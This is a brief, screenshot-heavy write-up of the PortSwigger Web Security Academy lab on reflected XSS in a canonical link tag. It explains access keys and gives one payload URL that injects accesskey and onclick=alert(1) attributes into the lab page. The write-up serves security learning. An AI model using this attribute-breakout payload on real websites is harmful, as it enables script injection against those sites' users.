# [XSS] Lab: Reflected XSS in canonical link tag

---

![Untitled](%5BXSS%5D%20Lab%20Reflected%20XSS%20in%20canonical%20link%20tag%2091a3bebacab64b8782e168b065e530f4/Untitled.png)

let's view the page source and search for rel

![Untitled](%5BXSS%5D%20Lab%20Reflected%20XSS%20in%20canonical%20link%20tag%2091a3bebacab64b8782e168b065e530f4/Untitled%201.png)

Access key is a way to exploit a conical tag 

![Untitled](%5BXSS%5D%20Lab%20Reflected%20XSS%20in%20canonical%20link%20tag%2091a3bebacab64b8782e168b065e530f4/Untitled%202.png)

access keys are shortcuts for focusing on elements and clicking hrefs. 

so let's look into the view page source to see how exactly the link is enclosed in 

so I tried a payload that doesn't require user interaction: 

![Untitled](%5BXSS%5D%20Lab%20Reflected%20XSS%20in%20canonical%20link%20tag%2091a3bebacab64b8782e168b065e530f4/Untitled%203.png)

this was the payload: 

![Untitled](%5BXSS%5D%20Lab%20Reflected%20XSS%20in%20canonical%20link%20tag%2091a3bebacab64b8782e168b065e530f4/Untitled%204.png)

---

now using this article from the burp suite learning matireal: 

[XSS in hidden input fields](https://portswigger.net/research/xss-in-hidden-input-fields)

```jsx
https://0ab300be049d629d818d7b5d003400e1.web-security-academy.net/?lb155%27accesskey=%27x%27onclick=%27alert(1)
```

![Untitled](%5BXSS%5D%20Lab%20Reflected%20XSS%20in%20canonical%20link%20tag%2091a3bebacab64b8782e168b065e530f4/Untitled%205.png)

![Untitled](%5BXSS%5D%20Lab%20Reflected%20XSS%20in%20canonical%20link%20tag%2091a3bebacab64b8782e168b065e530f4/Untitled%206.png)